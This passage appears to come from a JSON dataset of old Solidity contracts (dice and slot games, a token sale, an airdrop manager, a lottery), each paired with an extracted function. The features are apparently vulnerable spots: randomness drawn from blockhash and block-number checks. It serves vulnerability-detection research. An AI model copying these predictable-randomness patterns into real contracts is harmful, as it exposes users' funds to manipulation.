uint256(keccak256(\n abi.encodePacked(\n blockhash(blockn),\n entropy)\n ));\n }\n function random(uint256 upper, uint256 blockn, address entropy) internal view returns (uint256 randomNumber) {\n return maxRandom(blockn, entropy) % upper;\n }\n function calculateProfit(uint _initBet, uint _roll)\n private\n view\n returns (uint)\n {\n return ((((_initBet * (100 - (_roll.sub(1)))) / (_roll.sub(1)) + _initBet)) * houseEdge / houseEdgeDivisor) - _initBet;\n }\n struct playerRoll{\n uint200 tokenValue;\n uint48 blockn;\n uint8 rollUnder;\n }\n mapping(address => playerRoll) public playerRolls;\n function _playerRollDice(uint _rollUnder, TKN _tkn) private\n gameIsActive\n betIsValid(_tkn.value, _rollUnder)\n {\n require(_tkn.value < ((2 ** 200) - 1));\n require(block.number < ((2 ** 48) - 1));\n require(_zthToken(msg.sender));\n playerRoll memory roll = playerRolls[_tkn.sender];\n require(block.number != roll.blockn);\n if (roll.blockn != 0) {\n _finishBet(false, _tkn.sender);\n }\n roll.blockn = uint48(block.number);\n roll.tokenValue = uint200(_tkn.value);\n roll.rollUnder = uint8(_rollUnder);\n playerRolls[_tkn.sender] = roll;\n emit LogBet(_tkn.sender, _tkn.value, _rollUnder);\n totalBets += 1;\n totalZTHWagered += _tkn.value;\n }\n function finishBet() public\n gameIsActive\n returns (uint)\n {\n return _finishBet(true, msg.sender);\n }\n function _finishBet(bool delete_it, address target) private returns (uint){\n playerRoll memory roll = playerRolls[target];\n require(roll.tokenValue > 0);\n require(roll.blockn != block.number);\n uint result;\n if (block.number - roll.blockn > 255) {\n result = 1000;\n } else {\n result = random(99, roll.blockn, target) + 1;\n }\n uint rollUnder = roll.rollUnder;\n if (result < rollUnder) {\n uint profit = calculateProfit(roll.tokenValue, rollUnder);\n if (profit > maxProfit){\n profit = maxProfit;\n }\n contractBalance = contractBalance.sub(profit);\n emit LogResult(target, result, rollUnder, profit, roll.tokenValue, true);\n setMaxProfit();\n playerRolls[target] = playerRoll(uint200(0), uint48(0), uint8(0));\n ZTHTKN.transfer(target, profit + roll.tokenValue);\n return result;\n } else {\n emit LogResult(target, result, rollUnder, profit, roll.tokenValue, false);\n contractBalance = contractBalance.add(roll.tokenValue);\n playerRolls[target] = playerRoll(uint200(0), uint48(0), uint8(0));\n setMaxProfit();\n return result;\n }\n }\n struct TKN {address sender; uint value;}\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool) {\n require(msg.sender == ZTHTKNADDR);\n if (_from == ZethrBankroll) {\n contractBalance = contractBalance.add(_value);\n uint oldMaxProfit = maxProfit;\n setMaxProfit();\n emit MaxProfitChanged(oldMaxProfit, maxProfit);\n return true;\n } else {\n TKN memory _tkn;\n _tkn.sender = _from;\n _tkn.value = _value;\n uint8 chosenNumber = uint8(_data[0]);\n _playerRollDice(chosenNumber, _tkn);\n }\n return true;\n }\n function setMaxProfit() internal {\n emit CurrentContractBalance(contractBalance);\n maxProfit = (contractBalance * maxProfitAsPercentOfHouse) / maxProfitDivisor;\n }\n function ownerUpdateContractBalance(uint newContractBalance) public\n onlyOwner\n {\n contractBalance = newContractBalance;\n }\n function ownerSetMaxProfitAsPercentOfHouse(uint newMaxProfitAsPercent) public\n onlyOwner\n {\n require(newMaxProfitAsPercent <= 200000);\n maxProfitAsPercentOfHouse = newMaxProfitAsPercent;\n setMaxProfit();\n }\n function ownerSetMinBet(uint newMinimumBet) public\n onlyOwner\n {\n minBet = newMinimumBet;\n }\n function ownerTransferZTH(address sendTo, uint amount) public\n onlyOwner\n {\n contractBalance = contractBalance.sub(amount);\n setMaxProfit();\n require(ZTHTKN.transfer(sendTo, amount));\n emit LogOwnerTransfer(sendTo, amount);\n }\n function ownerPauseGame(bool newStatus) public\n onlyOwner\n {\n gamePaused = newStatus;\n }\n function ownerSetBankroll(address newBankroll) public\n onlyOwner\n {\n ZTHTKN.approve(ZethrBankroll, 0);\n ZethrBankroll = newBankroll;\n ZTHTKN.approve(newBankroll, MAX_INT);\n }\n function ownerChangeOwner(address newOwner) public\n onlyOwner\n {\n owner = newOwner;\n }\n function ownerkill() public\n onlyOwner\n {\n ZTHTKN.transfer(owner, contractBalance);\n selfdestruct(owner);\n }\n function dumpdivs() public{\n ZethrBankroll.transfer(address(this).balance);\n }\n function _zthToken(address _tokenContract) private view returns (bool) {\n return _tokenContract == ZTHTKNADDR;\n }\n}\nlibrary SafeMath {\n function mul(uint a, uint b) internal pure returns (uint) {\n if (a == 0) {\n return 0;\n }\n uint c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint a, uint b) internal pure returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal pure returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function _finishBet(bool delete_it, address target) private returns (uint){\nplayerRoll memory roll = playerRolls[target];\nrequire(roll.tokenValue > 0);\nrequire(roll.blockn != block.number);\nuint result;\nif (block.number - roll.blockn > 255) {\nresult = 1000;\n} else {\nresult = random(99, roll.blockn, target) + 1;\n}\nuint rollUnder = roll.rollUnder;\nif (result < rollUnder) {\nuint profit = calculateProfit(roll.tokenValue, rollUnder);\nif (profit > maxProfit){\nprofit = maxProfit;\n}\ncontractBalance = contractBalance.sub(profit);\nemit LogResult(target, result, rollUnder, profit, roll.tokenValue, true);\nsetMaxProfit();\nplayerRolls[target] = playerRoll(uint200(0), uint48(0), uint8(0));\nZTHTKN.transfer(target, profit + roll.tokenValue);\nreturn result;\n} else {\nemit LogResult(target, result, rollUnder, profit, roll.tokenValue, false);\ncontractBalance = contractBalance.add(roll.tokenValue);\nplayerRolls[target] = playerRoll(uint200(0), uint48(0), uint8(0));\nsetMaxProfit();\nreturn result;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b33"
  },
  "filename": "173.sol",
  "content": "pragma solidity ^0.4.24;\ncontract IMigrationContract {\n function migrate(address addr, uint256 nas) returns (bool success);\n}\ncontract SafeMath {\n function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x + y;\n assert((z >= x) && (z >= y));\n return z;\n }\n function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\n assert(x >= y);\n uint256 z = x - y;\n return z;\n }\n function safeMult(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x * y;\n assert((x == 0)||(z/x == y));\n return z;\n }\n}\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract EBBToken is StandardToken, SafeMath {\n string public constant name = \"易宝币\";\n string public constant symbol = \"EBB\";\n uint256 public constant decimals = 18;\n string public version = \"1.0\";\n address public ethFundDeposit;\n address public newContractAddr;\n bool public isFunding;\n uint256 public fundingStartBlock;\n uint256 public fundingStopBlock;\n uint256 public currentSupply;\n uint256 public tokenRaised = 0;\n uint256 public tokenMigrated = 0;\n uint256 public tokenExchangeRate = 5963;\n event AllocateToken(address indexed _to, uint256 _value);\n event IssueToken(address indexed _to, uint256 _value);\n event IncreaseSupply(uint256 _value);\n event DecreaseSupply(uint256 _value);\n event Migrate(address indexed _to, uint256 _value);\n function formatDecimals(uint256 _value) internal returns (uint256 ) {\n return _value * 10 ** decimals;\n }\n function EBBToken(\n address _ethFundDeposit,\n uint256 _currentSupply)\n {\n ethFundDeposit = _ethFundDeposit;\n isFunding = false;\n fundingStartBlock = 0;\n fundingStopBlock = 0;\n currentSupply = formatDecimals(_currentSupply);\n totalSupply = formatDecimals(1600000000);\n balances[msg.sender] = totalSupply;\n if(currentSupply > totalSupply) throw;\n }\n modifier isOwner() { require(msg.sender == ethFundDeposit); _; }\n function setTokenExchangeRate(uint256 _tokenExchangeRate) isOwner external {\n if (_tokenExchangeRate == 0) throw;\n if (_tokenExchangeRate == tokenExchangeRate) throw;\n tokenExchangeRate = _tokenExchangeRate;\n }\n function increaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + currentSupply > totalSupply) throw;\n currentSupply = safeAdd(currentSupply, value);\n IncreaseSupply(value);\n }\n function decreaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + tokenRaised > currentSupply) throw;\n currentSupply = safeSubtract(currentSupply, value);\n DecreaseSupply(value);\n }\n function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\n if (isFunding) throw;\n if (_fundingStartBlock >= _fundingStopBlock) throw;\n if (block.number >= _fundingStartBlock) throw;\n fundingStartBlock = _fundingStartBlock;\n fundingStopBlock = _fundingStopBlock;\n isFunding = true;\n }\n function stopFunding() isOwner external {\n if (!isFunding) throw;\n isFunding = false;\n }\n function setMigrateContract(address _newContractAddr) isOwner external {\n if (_newContractAddr == newContractAddr) throw;\n newContractAddr = _newContractAddr;\n }\n function changeOwner(address _newFundDeposit) isOwner() external {\n if (_newFundDeposit == address(0x0)) throw;\n ethFundDeposit = _newFundDeposit;\n }\n function migrate() external {\n if(isFunding) throw;\n if(newContractAddr == address(0x0)) throw;\n uint256 tokens = balances[msg.sender];\n if (tokens == 0) throw;\n balances[msg.sender] = 0;\n tokenMigrated = safeAdd(tokenMigrated, tokens);\n IMigrationContract newContract = IMigrationContract(newContractAddr);\n if (!newContract.migrate(msg.sender, tokens)) throw;\n Migrate(msg.sender, tokens);\n }\n function transferETH() isOwner external {\n if (this.balance == 0) throw;\n if (!ethFundDeposit.send(this.balance)) throw;\n }\n function allocateToken (address _addr, uint256 _eth) isOwner external {\n if (_eth == 0) throw;\n if (_addr == address(0x0)) throw;\n uint256 tokens = safeMult(formatDecimals(_eth), tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[_addr] += tokens;\n AllocateToken(_addr, tokens);\n }\n function () payable {\n if (!isFunding) throw;\n if (msg.value == 0) throw;\n if (block.number < fundingStartBlock) throw;\n if (block.number > fundingStopBlock) throw;\n uint256 tokens = safeMult(msg.value, tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[msg.sender] += tokens;\n IssueToken(msg.sender, tokens);\n }\n}",
  "extract_feature": [
    "function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\nif (isFunding) throw;\nif (_fundingStartBlock >= _fundingStopBlock) throw;\nif (block.number >= _fundingStartBlock) throw;\nfundingStartBlock = _fundingStartBlock;\nfundingStopBlock = _fundingStopBlock;\nisFunding = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b34"
  },
  "filename": "1761.sol",
  "content": "pragma solidity ^0.4.24;\ncontract ZTHReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool);\n}\ncontract ZTHInterface {\n function transfer(address _to, uint _value) public returns (bool);\n function approve(address spender, uint tokens) public returns (bool);\n}\ncontract Zlots is ZTHReceivingContract {\n using SafeMath for uint;\n address private owner;\n address private bankroll;\n uint totalSpins;\n uint totalZTHWagered;\n uint contractBalance;\n bool public gameActive;\n address private ZTHTKNADDR;\n address private ZTHBANKROLL;\n ZTHInterface private ZTHTKN;\n mapping (uint => bool) validTokenBet;\n event HouseRetrievedTake(\n uint timeTaken,\n uint tokensWithdrawn\n );\n event TokensWagered(\n address _wagerer,\n uint _wagered\n );\n event LogResult(\n address _wagerer,\n uint _result,\n uint _profit,\n uint _wagered,\n uint _category,\n bool _win\n );\n event Loss(address _wagerer, uint _block);\n event ThreeMoonJackpot(address _wagerer, uint _block);\n event TwoMoonPrize(address _wagerer, uint _block);\n event ZTHJackpot(address _wagerer, uint _block);\n event ThreeZSymbols(address _wagerer, uint _block);\n event ThreeTSymbols(address _wagerer, uint _block);\n event ThreeHSymbols(address _wagerer, uint _block);\n event ThreeEtherIcons(address _wagerer, uint _block);\n event ThreeGreenPyramids(address _wagerer, uint _block);\n event ThreeGoldPyramids(address _wagerer, uint _block);\n event ThreeWhitePyramids(address _wagerer, uint _block);\n event OneMoonPrize(address _wagerer, uint _block);\n event OneOfEachPyramidPrize(address _wagerer, uint _block);\n event TwoZSymbols(address _wagerer, uint _block);\n event TwoTSymbols(address _wagerer, uint _block);\n event TwoHSymbols(address _wagerer, uint _block);\n event TwoEtherIcons(address _wagerer, uint _block);\n event TwoGreenPyramids(address _wagerer, uint _block);\n event TwoGoldPyramids(address _wagerer, uint _block);\n event TwoWhitePyramids(address _wagerer, uint _block);\n event ReturnBet(\n address _wagerer\n );\n event TwoAndAHalfXMultiplier(\n address _wagerer\n );\n event OneAndAHalfXMultiplier(\n address _wagerer\n );\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n modifier onlyBankroll {\n require(msg.sender == bankroll);\n _;\n }\n modifier onlyOwnerOrBankroll {\n require(msg.sender == owner || msg.sender == bankroll);\n _;\n }\n modifier gameIsActive {\n require(gameActive == true);\n _;\n }\n constructor(address ZethrAddress, address BankrollAddress) public {\n ZTHTKNADDR = ZethrAddress;\n ZTHBANKROLL = BankrollAddress;\n owner = msg.sender;\n bankroll = ZTHBANKROLL;\n ZTHTKN = ZTHInterface(ZTHTKNADDR);\n ZTHTKN.approve(ZTHBANKROLL, 2**256 - 1);\n ZTHTKN.approve(owner, 2**256 - 1);\n validTokenBet[5e18] = true;\n validTokenBet[10e18] = true;\n validTokenBet[25e18] = true;\n validTokenBet[50e18] = true;\n gameActive = true;\n }\n function() public payable { }\n struct TKN { address sender; uint value; }\n function tokenFallback(address _from, uint _value, bytes ) public returns (bool){\n if (_from == bankroll) {\n contractBalance = contractBalance.add(_value);\n return true;\n } else {\n TKN memory _tkn;\n _tkn.sender = _from;\n _tkn.value = _value;\n _spinTokens(_tkn);\n return true;\n }\n }\n struct playerSpin {\n uint200 tokenValue;\n uint48 blockn;\n }\n mapping(address => playerSpin) public playerSpins;\n function _spinTokens(TKN _tkn) private {\n require(gameActive);\n require(_zthToken(msg.sender));\n require(validTokenBet[_tkn.value]);\n require(jackpotGuard(_tkn.value));\n require(_tkn.value < ((2 ** 200) - 1));\n require(block.number < ((2 ** 48) - 1));\n address _customerAddress = _tkn.sender;\n uint _wagered = _tkn.value;\n playerSpin memory spin = playerSpins[_tkn.sender];\n contractBalance = contractBalance.add(_wagered);\n require(block.number != spin.blockn);\n if (spin.blockn != 0) {\n _finishSpin(_tkn.sender);\n }\n spin.blockn = uint48(block.number);\n spin.tokenValue = uint200(_wagered);\n playerSpins[_tkn.sender] = spin;\n totalSpins += 1;\n totalZTHWagered += _wagered;\n emit TokensWagered(_customerAddress, _wagered);\n }\n function finishSpin() public\n gameIsActive\n returns (uint)\n {\n return _finishSpin(msg.sender);\n }\n function _finishSpin(address target)\n private returns (uint)\n {\n playerSpin memory spin = playerSpins[target];\n require(spin.tokenValue > 0);\n require(spin.blockn != block.number);\n uint profit = 0;\n uint category = 0;\n uint result;\n if (block.number - spin.blockn > 255) {\n result = 9999;\n } else {\n result = random(1000000, spin.blockn, target);\n }\n if (result > 476661) {\n emit Loss(target, spin.blockn);\n emit LogResult(target, result, profit, spin.tokenValue, category, false);\n } else {\n if (result < 1) {\n profit = SafeMath.mul(spin.tokenValue, 500);\n category = 1;\n emit ThreeMoonJackpot(target, spin.blockn);\n } else {\n if (result < 298) {\n profit = SafeMath.mul(spin.tokenValue, 232);\n category = 2;\n emit TwoMoonPrize(target, spin.blockn);\n } else {\n if (result < 3127) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 232), 10);\n category = 3;\n emit ZTHJackpot(target, spin.blockn);\n } else {\n if (result < 5956) {\n profit = SafeMath.mul(spin.tokenValue, 25);\n category = 4;\n emit ThreeZSymbols(target, spin.blockn);\n } else {\n if (result < 8785) {\n profit = SafeMath.mul(spin.tokenValue, 25);\n category = 5;\n emit ThreeTSymbols(target, spin.blockn);\n } else {\n if (result < 11614) {\n profit = SafeMath.mul(spin.tokenValue, 25);\n category = 6;\n emit ThreeHSymbols(target, spin.blockn);\n } else {\n if (result < 14443) {\n profit = SafeMath.mul(spin.tokenValue, 50);\n category = 7;\n emit ThreeEtherIcons(target, spin.blockn);\n } else {\n if (result < 17272) {\n profit = SafeMath.mul(spin.tokenValue, 40);\n category = 8;\n emit ThreeGreenPyramids(target, spin.blockn);\n } else {\n if (result < 20101) {\n profit = SafeMath.mul(spin.tokenValue, 20);\n category = 9;\n emit ThreeGoldPyramids(target, spin.blockn);\n } else {\n if (result < 22929) {\n profit = SafeMath.mul(spin.tokenValue, 20);\n category = 10;\n emit ThreeWhitePyramids(target, spin.blockn);\n } else {\n if (result < 52332) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 125),10);\n category = 11;\n emit OneMoonPrize(target, spin.blockn);\n } else {\n if (result < 120225) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 15),10);\n category = 12;\n emit OneOfEachPyramidPrize(target, spin.blockn);\n } else {\n if (result < 171146) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 232),100);\n category = 13;\n emit TwoZSymbols(target, spin.blockn);\n } else {\n if (result < 222067) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 232),100);\n category = 14;\n emit TwoTSymbols(target, spin.blockn);\n } else {\n if (result < 272988) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 232),100);\n category = 15;\n emit TwoHSymbols(target, spin.blockn);\n } else {\n if (result < 323909) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 375),100);\n category = 16;\n emit TwoEtherIcons(target, spin.blockn);\n } else {\n if (result < 374830) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 35),10);\n category = 17;\n emit TwoGreenPyramids(target, spin.blockn);\n } else {\n if (result < 425751) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 225),100);\n category = 18;\n emit TwoGoldPyramids(target, spin.blockn);\n } else {\n profit = SafeMath.mul(spin.tokenValue, 2);\n category = 19;\n emit TwoWhitePyramids(target, spin.blockn);\n }\n emit LogResult(target, result, profit, spin.tokenValue, category, true);\n contractBalance = contractBalance.sub(profit);\n ZTHTKN.transfer(target, profit);\n }}}}}}}}}}}}}}}}}}\n playerSpins[target] = playerSpin(uint200(0), uint48(0));\n return result;\n }\n function jackpotGuard(uint _wager)\n private\n view\n returns (bool)\n {\n uint maxProfit = SafeMath.mul(_wager, 500);\n uint ninetyContractBalance = SafeMath.mul(SafeMath.div(contractBalance, 10), 9);\n return (maxProfit <= ninetyContractBalance);\n }\n function maxRandom(uint blockn, address entropy) private view returns (uint256 randomNumber) {\n return uint256(keccak256(\n abi.encodePacked(\n blockhash(blockn),\n entropy)\n ));\n }\n function random(uint256 upper, uint256 blockn, address entropy) internal view returns (uint256 randomNumber) {\n return maxRandom(blockn, entropy) % upper;\n }\n function balanceOf() public view returns (uint) {\n return contractBalance;\n }\n function addNewBetAmount(uint _tokenAmount)\n public\n onlyOwner\n {\n validTokenBet[_tokenAmount] = true;\n }\n function pauseGame() public onlyOwner {\n gameActive = false;\n }\n function resumeGame() public onlyOwner {\n gameActive = true;\n }\n function changeOwner(address _newOwner) public onlyOwner {\n owner = _newOwner;\n }\n function changeBankroll(address _newBankroll) public onlyOwner {\n bankroll = _newBankroll;\n }\n function divertDividendsToBankroll()\n public\n onlyOwner\n {\n bankroll.transfer(address(this).balance);\n }\n function testingSelfDestruct()\n public\n onlyOwner\n {\n ZTHTKN.transfer(owner, contractBalance);\n selfdestruct(owner);\n }\n function _zthToken(address _tokenContract) private view returns (bool) {\n return _tokenContract == ZTHTKNADDR;\n }\n}\nlibrary SafeMath {\n function mul(uint a, uint b) internal pure returns (uint) {\n if (a == 0) {\n return 0;\n }\n uint c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint a, uint b) internal pure returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal pure returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function _spinTokens(TKN _tkn) private {\nrequire(gameActive);\nrequire(_zthToken(msg.sender));\nrequire(validTokenBet[_tkn.value]);\nrequire(jackpotGuard(_tkn.value));\nrequire(_tkn.value < ((2 ** 200) - 1));\nrequire(block.number < ((2 ** 48) - 1));\naddress _customerAddress = _tkn.sender;\nuint _wagered = _tkn.value;\nplayerSpin memory spin = playerSpins[_tkn.sender];\ncontractBalance = contractBalance.add(_wagered);\nrequire(block.number != spin.blockn);\nif (spin.blockn != 0) {\n_finishSpin(_tkn.sender);\n}\nspin.blockn = uint48(block.number);\nspin.tokenValue = uint200(_wagered);\nplayerSpins[_tkn.sender] = spin;\ntotalSpins += 1;\ntotalZTHWagered += _wagered;\nemit TokensWagered(_customerAddress, _wagered);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b35"
  },
  "filename": "1791.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract Claimable is Ownable {\n address public pendingOwner;\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n}\ncontract SimpleFlyDropToken is Claimable {\n using SafeMath for uint256;\n ERC20 internal erc20tk;\n function setToken(address _token) onlyOwner public {\n require(_token != address(0));\n erc20tk = ERC20(_token);\n }\n function multiSend(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(_destAddrs.length == _values.length);\n uint256 i = 0;\n for (; i < _destAddrs.length; i = i.add(1)) {\n if (!erc20tk.transfer(_destAddrs[i], _values[i])) {\n break;\n }\n }\n return (i);\n }\n}\ncontract DelayedClaimable is Claimable {\n uint256 public end;\n uint256 public start;\n function setLimits(uint256 _start, uint256 _end) onlyOwner public {\n require(_start <= _end);\n end = _end;\n start = _start;\n }\n function claimOwnership() onlyPendingOwner public {\n require((block.number <= end) && (block.number >= start));\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n end = 0;\n }\n}\ncontract FlyDropTokenMgr is DelayedClaimable {\n using SafeMath for uint256;\n address[] dropTokenAddrs;\n SimpleFlyDropToken currentDropTokenContract;\n function prepare(uint256 _rand,\n address _from,\n address _token,\n uint256 _value) onlyOwner public returns (bool) {\n require(_token != address(0));\n require(_from != address(0));\n require(_rand > 0);\n if (ERC20(_token).allowance(_from, this) < _value) {\n return false;\n }\n if (_rand > dropTokenAddrs.length) {\n SimpleFlyDropToken dropTokenContract = new SimpleFlyDropToken();\n dropTokenAddrs.push(address(dropTokenContract));\n currentDropTokenContract = dropTokenContract;\n } else {\n currentDropTokenContract = SimpleFlyDropToken(dropTokenAddrs[_rand.sub(1)]);\n }\n currentDropTokenContract.setToken(_token);\n return ERC20(_token).transferFrom(_from, currentDropTokenContract, _value);\n }\n function flyDrop(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(address(currentDropTokenContract) != address(0));\n return currentDropTokenContract.multiSend(_destAddrs, _values);\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}",
  "extract_feature": [
    "function claimOwnership() onlyPendingOwner public {\nrequire((block.number <= end) && (block.number >= start));\nemit OwnershipTransferred(owner, pendingOwner);\nowner = pendingOwner;\npendingOwner = address(0);\nend = 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b36"
  },
  "filename": "184.sol",
  "content": "pragma solidity ^0.4.24;\ncontract BREBuy {\n struct ContractParam {\n uint32 totalSize ;\n uint256 singlePrice;\n uint8 pumpRate;\n bool hasChange;\n }\n address owner = 0x0;\n uint32 gameIndex = 0;\n uint256 totalPrice= 0;\n bool isLock = false;\n ContractParam public setConfig;\n ContractParam public curConfig;\n address[] public addressArray = new address[](0);\n event openLockEvent();\n event addPlayerEvent(uint32 gameIndex,address player);\n event gameOverEvent(uint32 gameIndex,uint32 totalSize,uint256 singlePrice,uint8 pumpRate,address winAddr,uint overTime);\n event stopGameEvent(uint totalBalace,uint totalSize,uint price);\n constructor ( uint32 _totalSize,\n uint256 _singlePrice\n ) public {\n owner = msg.sender;\n setConfig = ContractParam(_totalSize,_singlePrice * 1 finney ,5,false);\n curConfig = ContractParam(_totalSize,_singlePrice * 1 finney ,5,false);\n startNewGame();\n }\n modifier onlyOwner {\n require(msg.sender == owner,\"only owner can call this function\");\n _;\n }\n modifier notLock {\n require(isLock == false,\"contract current is lock status\");\n _;\n }\n function isNotContract(address addr) private view returns (bool) {\n uint size;\n assembly { size := extcodesize(addr) }\n return size <= 0;\n }\n function updateLock(bool b) onlyOwner public {\n require(isLock != b,\" updateLock new status == old status\");\n isLock = b;\n if(isLock) {\n stopGame();\n }else{\n startNewGame();\n emit openLockEvent();\n }\n }\n function stopGame() onlyOwner private {\n if(addressArray.length <= 0) {\n return;\n }\n uint totalBalace = address(this).balance;\n uint price = totalBalace / addressArray.length;\n for(uint i = 0; i < addressArray.length; i++) {\n address curPlayer = addressArray[i];\n curPlayer.transfer(price);\n }\n emit stopGameEvent(totalBalace,addressArray.length,price);\n addressArray.length=0;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n function changeConfig( uint32 _totalSize,uint256 _singlePrice,uint8 _pumpRate) onlyOwner public payable {\n curConfig.hasChange = true;\n if(setConfig.totalSize != _totalSize) {\n setConfig.totalSize = _totalSize;\n }\n if(setConfig.pumpRate != _pumpRate){\n setConfig.pumpRate = _pumpRate;\n }\n if(setConfig.singlePrice != _singlePrice * 1 finney){\n setConfig.singlePrice = _singlePrice * 1 finney;\n }\n }\n function startNewGame() private {\n gameIndex++;\n if(curConfig.hasChange) {\n if(curConfig.totalSize != setConfig.totalSize) {\n curConfig.totalSize = setConfig.totalSize;\n }\n if(curConfig.singlePrice != setConfig.singlePrice){\n curConfig.singlePrice = setConfig.singlePrice;\n }\n if( curConfig.pumpRate != setConfig.pumpRate) {\n curConfig.pumpRate = setConfig.pumpRate;\n }\n curConfig.hasChange = false;\n }\n addressArray.length=0;\n }\n function addPlayer() notLock public payable {\n require(isNotContract(msg.sender),\"Contract not call addPlayer\");\n require(msg.value == curConfig.singlePrice,\"msg.value error\");\n totalPrice = totalPrice + msg.value;\n addressArray.push(msg.sender);\n emit addPlayerEvent(gameIndex,msg.sender);\n if(addressArray.length >= curConfig.totalSize) {\n gameResult();\n startNewGame();\n }\n }\n function getGameInfo() public view returns (uint256,uint32,uint256,uint8,address[],uint256,bool) {\n return (gameIndex,\n curConfig.totalSize,\n curConfig.singlePrice,\n curConfig.pumpRate,\n addressArray,\n totalPrice,\n isLock);\n }\n function gameResult() private {\n uint index = getRamdon();\n address lastAddress 